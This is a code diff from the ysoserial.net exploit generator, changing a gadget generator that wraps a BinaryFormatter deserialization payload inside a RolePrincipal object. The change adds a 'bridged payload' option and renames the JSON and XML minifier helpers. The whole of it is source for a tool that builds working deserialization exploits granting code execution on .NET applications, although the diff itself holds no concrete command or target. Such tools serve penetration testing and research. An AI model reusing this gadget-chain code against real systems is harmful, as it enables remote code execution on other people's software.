@@ -27,10 +27,24 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            IGenerator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
+
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
             
             var payloadClaimsPrincipalMarshal = new RolePrincipalMarshal(b64encoded);
@@ -52,11 +66,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = JsonMinifier.Minify(payload, new string[] { "System.Web" }, null);
+                        payload = JsonHelper.Minify(payload, new string[] { "System.Web" }, null);
                     }
                     else
                     {
-                        payload = JsonMinifier.Minify(payload, null, null);
+                        payload = JsonHelper.Minify(payload, null, null);
                     }
                 }
 
@@ -86,11 +100,11 @@ namespace ysoserial.Generators
                     if (inputArgs.UseSimpleType)
                     {
                         // System.Web needs to be there! ust seems useless here
-                        payload = XmlMinifier.Minify(payload, new string[] { "" }, null);
+                        payload = XmlHelper.Minify(payload, new string[] { "" }, null);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null);
+                        payload = XmlHelper.Minify(payload, null, null);
                     }
                 }
 
@@ -121,11 +135,11 @@ namespace ysoserial.Generators
                     if (inputArgs.UseSimpleType)
                     {
                         // System.Web needs to be there! ust seems useless here
-                        payload = XmlMinifier.Minify(payload, new string[] { }, null);
+                        payload = XmlHelper.Minify(payload, new string[] { }, null);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null);
+                        payload = XmlHelper.Minify(payload, null, null);
                     }
                 }
 
